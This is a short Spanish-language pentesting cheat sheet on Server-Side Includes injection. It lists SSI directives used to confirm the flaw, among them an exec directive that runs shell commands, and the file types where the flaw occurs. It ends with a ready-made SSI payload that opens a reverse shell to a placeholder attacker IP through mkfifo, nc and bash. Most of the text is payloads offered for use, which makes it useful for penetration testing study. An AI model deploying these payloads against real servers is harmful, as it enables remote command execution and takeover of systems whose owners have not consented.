Consiste en la ejecución de una clase de código que crea contenido de forma dinámica en los servidores web. Algunas etiquetas serían las siguientes:

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

Estas se pueden utilizar como pruebas de que la vulnerabilidad efectivamente existe. Puede encontrarse en archivos del tipo .shtml .shtm o .stm aunque también se puede encontrar en .html.

Reverse shell de este tipo de vulnerabilidades:

```html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

